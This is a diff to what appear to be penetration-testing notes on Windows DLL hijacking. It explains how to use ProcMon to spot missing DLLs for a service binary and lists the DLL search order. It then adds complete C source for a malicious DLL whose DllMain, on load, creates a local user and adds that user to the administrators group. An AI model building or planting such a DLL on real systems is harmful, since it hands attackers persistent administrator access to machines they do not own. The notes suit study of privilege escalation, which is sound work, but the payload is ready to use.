@@ -1,4 +1,4 @@
-
+# We can try to run the service bin and see called DLLs on ProcMon, if there is missing ones, we can try to write on some dirs to get code executed. In ProcMon we nee to filter Process Name is XPTO.exe.
 
 # Standard DLL search order 
 1. The directory from which the application loaded.
@@ -8,3 +8,31 @@
 5. The current directory.
 6. The directories that are listed in the PATH environment variable.
 # When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
+
+# DLL in C code:
+=============================
+#include <stdlib.h>
+#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handler
+DWORD ul_reason_for_call,// Reason
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // run the next code
+        int i;
+  	    i = system ("net user user2 password2 /add");
+  	    i = system ("net localgroup administrators user2 /add");
+        break;
+        case DLL_THREAD_ATTACH: // call a new thread
+        break;
+        case DLL_THREAD_DETACH: // finish the thread
+        break;
+        case DLL_PROCESS_DETACH: // done with the job
+        break;
+    }
+    return TRUE;
+}
+===============================
